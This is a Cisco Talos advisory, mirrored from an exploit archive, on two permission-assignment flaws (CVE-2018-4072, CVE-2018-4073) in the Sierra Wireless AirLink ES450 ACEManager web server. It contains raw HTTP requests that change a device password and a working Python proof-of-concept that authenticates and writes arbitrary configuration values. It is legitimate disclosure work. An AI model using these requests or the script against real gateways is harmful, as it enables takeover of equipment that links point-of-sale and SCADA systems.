@@ -1,0 +1,145 @@
+id: 32614
+date: 04/29/2019
+title: Sierra Wireless AirLink ES450 ACEManager Embedded_Ace_Set_Task.cgi Permission Assignment Exploit
+author: Cisco Talos
+cves: CVE-2018-4072, CVE-2018-4073
+
+Sierra Wireless AirLink ES450 ACEManager Embedded_Ace_Set_Task.cgi Permission Assignment Vulnerability
+
+CVE Number
+
+CVE-2018-4072, CVE-2018-4073
+
+Summary
+
+An exploitable Permission Assignment vulnerability exists in the ACEManager EmbeddedAceSet_Task.cgi functionality of Sierra Wireless AirLink ES450 FW 4.9.3. A specially crafted HTTP request can cause a arbitrary setting writes, resulting in the unverified changes to any system setting. An attacker can make an authenticated HTTP request, or run the binary as any user, to trigger this vulnerability.
+Tested Versions
+
+Sierra Wireless AirLink ES450 FW 4.9.3
+
+Product URLs
+
+https://www.sierrawireless.com/products-and-solutions/routers-gateways/es450/
+CVSSv3 Score
+
+9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L
+CWE
+
+CWE-732: Incorrect Permission Assignment for Critical Resource
+
+
+Details
+
+Sierra Wireless is a wireless communications equipement designer and manufacturer. They provide both embedded solutions as well as wireless hardware solutions, including both the ES450 and GX450 devices. The AirLink ES450 is a LTE gateway designed for distributed enterprise. The ES450 is typically seen connecting Point-of-sale devices, remote SCADA equipment, or other business critical equipment. The AirLink ES450 also provides a terminal server for remote out-of-band administration.
+
+ACEManager is the web server included with the AirLink ES450. This web server is responsible for the majority of interactions in the device. Some specific capabilities of the web server are routing, device reconfiguration, user authentication and certificate management. The vendor has stated that the ACEManager web application is not accessible by default from the Cellular WAN.
+
+These vulnerabilities were discovered and tested using the AirLink ES450. Most likely this vulnerabilities also affects the AirLink GX450 product as well.
+CVE-2018-4072
+
+The EmbeddedAceSet_Task.cgi executable is used to change MSCII configuration values within the configuration manager of the AirLink ES450. This binary does not have any restricted configuration settings, so once the MSCIID is discovered, any authenticated user can send configuration changes using the /cgi-bin/Embedded_Ace_Set_Task.cgi endpoint. The following request shows the MSCIID for changing the user password for the device.
+
+ POST /cgi-bin/Embedded_Ace_Set_Task.cgi HTTP/1.1
+ Host: 192.168.13.31:9191
+ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET        CLR 1.1.4322; .NET CLR 2.0.50215)
+ Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://192.168.13.31:9191/admin/ACEmanagerX.html
+ Content-Type: text/xml
+ Cache-Control: no-cache, must-revalidate
+ Pragma: no-cache
+ Content-Length: 15
+ Cookie: token=8b61123e579dcaa49a707abc4fcc1016
+ Connection: close
+
+ 5003=password0
+
+This binary has -rwxr-xr-x permissions which allows the binary to be executed outside of the web user interface as well, such as if a user logs in over SSH. This allows a low-privilege user to change the password of other users on the system, enable or disable services, and change any configuration set on the device.
+CVE-2018-4073
+
+Additionally, the binary the endpoint /cgi-bin/Embeded_Ace_TLSet_Task.cgi is a very similar endpoint that is designed for use with setting table values. The following request shows the MSCIID for changing the user password for the device
+
+ POST /cgi-bin/Embedded_Ace_TLSet_Task.cgi HTTP/1.1
+ Host: 192.168.13.31:9191
+ User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50215)
+ Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://192.168.13.31:9191/admin/ACEmanagerX.html
+ Content-Type: text/xml
+ Cache-Control: no-cache, must-revalidate
+ Pragma: no-cache
+ Content-Length: 28
+ Cookie: token=30578cf7228232d357e029347617af5c
+ Connection: close
+
+ colsid=5003&data=password012
+
+This binary has -rwxr-xr-x permissions which allows the binary to be executed outside of the web user interface as well, such as if a user logs in over SSH. This allows a low-privilege user to change the password of other users on the system, enable or disable services, and change any configuration set on the device.
+
+Exploit Proof of Concept
+
+ #!/usr/bin/env python
+ #Author : Carl Hurd, Cisco Talos
+ import sys
+ import socket
+ import time
+ import requests
+
+ from requests_toolbelt.utils import dump
+
+ def auth(ip, port, password):
+      data = """<request xmlns="urn:acemanager">
+ <connect>
+ <login>user</login>
+ <password><![CDATA[{}]]></password>
+ </connect>
+ </request>""".format(password)
+
+      response = requests.post("http://"+ip+":"+port+"/xml/Connect.xml", data=data)
+
+      try:
+           cookies = dict(token=response.headers["Set-Cookie"].split("; ")[0][len("token="):])
+           return cookies
+      except:
+           print("Error while authenticating")
+           sys.exit(0)
+
+ def main():
+      if len(sys.argv) < 6 or len(sys.argv) > 6:
+           print("Usage : {} [ip address] [port] [password of user] [msciid to set] [msciid value]".format(sys.argv[0]))
+           sys.exit(0)
+
+      ip = sys.argv[1]
+      port = sys.argv[2]
+      password = sys.argv[3]
+      msciid = sys.argv[4]
+      msciid_val = sys.argv[5]
+
+      print("MSCIID : {}\nMSCIID VALUE : {}".format(msciid, msciid_val))
+
+      cookies = auth(ip, port, password)
+
+      data = msciid + "=" + msciid_val
+      response = requests.post("http://"+ip+":"+port+"/cgi-bin/Embedded_Ace_Set_Task.cgi", cookies=cookies, data=data)
+
+      print(response.text)
+
+ if __name__ == "__main__":
+      main()
+
+Timeline
+
+2018-12-14 - Vendor disclosure
+2018-12-17 - Vendor acknowledged
+2019-01-08 - Discussion to review vendor's analysis of issues
+2019-03-26 - Vendor established timelines for fix/public disclosure
+2019-04-20 - Talos provided revised CVSS score on TALOS-2018-0746, TALOS-2018-0751, TALOS-2018-0752, TALOS-2018-0755, and TALOS-2018-0756
+2019-04-25 - Public Release
+
+Credit
+
+Discovered by Carl Hurd of Cisco Talos.
+
+#  0day.today [2023-03-26]  #
